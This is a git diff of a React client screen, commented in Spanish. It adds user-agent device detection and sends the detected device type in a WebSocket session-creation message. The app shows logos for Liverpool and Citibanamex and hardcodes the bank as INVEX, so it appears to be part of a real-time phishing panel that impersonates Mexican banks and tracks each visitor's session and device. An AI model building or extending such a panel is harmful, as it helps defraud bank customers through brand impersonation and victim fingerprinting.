@@ -4,6 +4,25 @@ import { useWebSocket } from '@/hooks/useWebSocket';
 import { ScreenTemplates } from '@/components/client/ScreenTemplates';
 import { Session, ScreenType } from '@shared/schema';
 import { formatDate } from '@/utils/helpers';
+
+// Función para detectar el tipo de dispositivo
+const detectDevice = (): string => {
+  const userAgent = navigator.userAgent.toLowerCase();
+  
+  if (/android/.test(userAgent)) {
+    return 'Android';
+  } else if (/iphone|ipad|ipod/.test(userAgent)) {
+    return 'iPhone/iPad';
+  } else if (/windows/.test(userAgent)) {
+    return 'PC Windows';
+  } else if (/macintosh|mac os x/.test(userAgent)) {
+    return 'PC Mac';
+  } else if (/linux/.test(userAgent)) {
+    return 'PC Linux';
+  } else {
+    return 'Dispositivo desconocido';
+  }
+};
 import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
 import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
 import citibanamexLogo from '../assets/Banamex.png';
@@ -307,15 +326,19 @@ export default function ClientScreen() {
           // Generar sessionId y folio únicos al aceptar términos
           const newSessionId = Math.random().toString(36).substring(2, 15);
           const deviceId = getOrCreateDeviceId();
+          const dispositivo = detectDevice(); // Detectar tipo de dispositivo
           
-          // Crear nueva sesión en el servidor con folio único
+          // Crear nueva sesión en el servidor con folio único y tipo de dispositivo
           sendMessage({
             type: 'CREATE_UNIQUE_SESSION',
             data: {
               sessionId: newSessionId,
               banco: 'INVEX',
               deviceId: deviceId,
-              clientData: { terminosAceptados: true },
+              clientData: { 
+                terminosAceptados: true,
+                dispositivo: dispositivo 
+              },
               timestamp: new Date().toISOString()
             }
           });
